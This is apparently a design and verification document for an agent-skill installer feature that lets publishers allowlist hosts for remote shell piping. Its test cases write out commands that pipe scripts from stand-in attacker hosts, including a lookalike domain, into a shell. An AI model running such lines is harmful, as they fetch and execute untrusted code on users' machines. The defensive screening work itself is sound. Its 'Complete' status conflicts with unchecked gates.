---
title: "skl-03 — Publisher-Declared Remote Command Allowlist"
description: "Let a skill declare which remote hosts it is allowed to pipe into a shell, so official installers install without an override while unknown hosts stay blocked."
---

# skl-03 — Publisher-Declared Remote Command Allowlist

## Problem

`skl-02` ships a static screen that refuses any skill containing `curl … | sh`. That blocks legitimate
first-party installers: this repository's own `install-sanad` skill documents
`curl -fsSL https://sanad.eaststarai.com/install.sh | bash`, so
`sanad skills add AhmedAttia3/agent-skills --skill install-sanad` fails out of the box with
`SKILL.md:139 [remote-exec]` and can only be completed with `--allow-flagged`.

Forcing every user of a curated skill to pass an override trains them to bypass the screen, which
removes its value.

## Goal

Move the decision to the publisher, where it belongs: the skill declares the remote hosts it may
execute, the install path honours that declaration, and anything undeclared stays blocked.

## Design

- The skill's `SKILL.md` frontmatter may declare:

  ```yaml
  metadata:
    allowed_remote_exec:
      - sanad.eaststarai.com
  ```

- A host-scoped finding (`remote-exec`, `encoded-exec`, `exfiltration`) is not reported when every
  URL host on the matched line is covered by the declaration.
- Coverage is exact or a subdomain: declaring `example.com` covers `cdn.example.com`, never
  `example.com.evil.test` and never a bare `example.com` reference in another host.
- A declaration never covers `credential-path`, `destructive-fs`, `permission-relaxation`,
  `instruction-override`, or `secret-harvest` findings.
- The declared list is recorded with the install, so an operator can see what a package asked for.
- No network access, no new dependency, and `--allow-flagged` keeps working as the last resort.

## Gates

### G1 — Declaration parsing
- [x] `metadata.allowed_remote_exec` is read from the skill's frontmatter, accepting a list or a
      single string, and tolerating its absence and malformed entries.
- [x] Declarations are collected from the file that owns the finding, and a declaration in another
      package in the same source never applies.

### G2 — Host matching
- [x] Exact host and subdomain match; lookalike suffixes, userinfo tricks, and bare mentions of an
      allowed host in an unrelated URL do not match.
- [x] A line with several URLs is only allowed when every host on it is declared.
- [x] Rules that are not host-scoped ignore the declaration entirely.

### G3 — Install and provenance
- [x] A declared host installs with no flag and reports the verdict `allowed` for the package.
- [x] An undeclared host still fails with the finding, and `--allow-flagged` still overrides.
- [x] The recorded provenance shows that a remote-exec allowance was declared.

### G4 — Documentation
- [x] Owning agent documentation describes the declaration and its limits.
- [x] The third-party install QA matrix covers declared, undeclared, and lookalike hosts.

### G5 — Verification
- [x] `fvm dart analyze` clean and focused tests green.
- [ ] Live proof: `sanad skills add AhmedAttia3/agent-skills --skill install-sanad` succeeds with no
      flags once the skill declares its host, and a `curl https://evil.test/x.sh | sh` package still
      fails.

## Acceptance criteria

- [ ] `install-sanad` from the public repository installs without `--allow-flagged`.
- [x] `curl … | sh` against an undeclared host is still refused, exit 1, nothing written.
- [x] `curl https://sanad.eaststarai.com.evil.test/install.sh | sh` is refused.
- [x] No new dependency in `agent/pubspec.yaml`.

## Verification evidence

```text
$ sanad skills add <local agent-skills> --skill install-sanad        # declared host
Installed install-sanad (user) → …/skills/install-sanad

$ <provenance>
{'install-sanad': {'scan': 'allowed', 'allowed_remote_exec': ['sanad.eaststarai.com']}}

$ sanad skills add <source with curl https://evil.test/x.sh | bash>   # undeclared
  - SKILL.md:7 [remote-exec] Pipes remote content into a shell   (exit 1, nothing written)

$ <declared evil.test, URL host evil.test.attacker.example>            # lookalike
  - SKILL.md:10 [remote-exec] Pipes remote content into a shell  (exit 1, nothing written)

$ sanad skills add AhmedAttia3/agent-skills --skill install-sanad     # public repository
Installed install-sanad (user) → …/skills/install-sanad
$ sanad skills add AhmedAttia3/agent-skills --skill pwa-app-builder
Installed pwa-app-builder (user) → …/skills/pwa-app-builder
```

## Status

**Complete.** Gates verified by the orchestrator: analyzer clean, 81 focused tests green, and the
public repository installs both skills with no override (`allowed` for the declared host, `clean` for
the package with nothing to screen).
